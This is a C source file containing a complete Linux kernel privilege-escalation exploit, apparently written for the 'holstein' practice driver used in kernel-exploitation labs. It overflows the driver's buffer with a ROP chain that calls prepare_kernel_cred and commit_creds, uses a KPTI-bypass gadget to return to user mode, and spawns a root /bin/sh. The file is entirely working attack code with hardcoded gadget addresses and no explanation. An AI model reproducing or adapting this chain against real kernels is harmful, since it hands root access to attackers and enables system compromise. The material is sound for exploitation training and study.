#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds        0xffffffff8106e390
#define rop_pop_rdi               0xffffffff8127bbdc
#define rop_pop_rcx               0xffffffff8132cdd3
#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
#define rop_bypass_kpti 0xffffffff81800e26

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {"NULL"};
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

int main() {
    save_state();
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) fatal("open(\"/dev/holstein\")");

    char buf[0x800] = {};
    memset(buf, 'A', 0x408);
    unsigned long* chain = (unsigned long*) &buf[0x408];
    *chain++ = rop_pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    *chain++ = rop_pop_rcx; // set rcx = 0 because it's the counter for rep movsq loop 
    *chain++ = 0;
    *chain++ = rop_mov_rdi_rax_rep_movsq;
    *chain++ = commit_creds;
    *chain++ = rop_bypass_kpti;
    *chain++ = 0xdeadbeefcafebabe;
    *chain++ = 0xdeadbeefcafebabe;
    *chain++ = (unsigned long) win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, (void*) chain - (void*) buf);
    close(fd);

    return 0;
}